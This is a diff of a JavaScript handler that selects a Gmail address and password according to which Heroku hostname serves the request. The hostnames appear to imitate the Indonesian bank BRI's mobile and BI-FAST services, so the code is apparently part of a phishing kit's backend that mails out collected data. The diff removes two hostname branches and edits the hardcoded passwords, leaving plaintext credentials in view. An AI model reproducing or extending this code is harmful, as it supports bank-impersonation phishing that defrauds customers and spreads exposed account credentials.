@@ -7,26 +7,14 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
-     if (url == 'informasi-brim-terbaru.herokuapp.com'){
-
-       email = 'informasibrimoterbaru@gmail.com'
-       pass = 'iavumvegcmcoycwo'
-    }else
-    
-     if (url == 'bifast-bri-new.herokuapp.com'){
-
-       email = 'anjayapp9@gmail.com'
-       pass = 'wfhcfhgoxaqmphva'
-    }else
-    
     if (url == 'bifast-brii.herokuapp.com'){
 
        email = 'appanjay717@gmail.com'
-       pass = 'keyumxdlhcjkbrip'
+       pass = 'keyumxdcjkbrip'
     }
     else {
          email = 'appanjay717@gmail.com'
-         pass = 'keyumxdlhcjkbrip'
+         pass = 'keyumxdlhcjkip'
     }
         
         try {
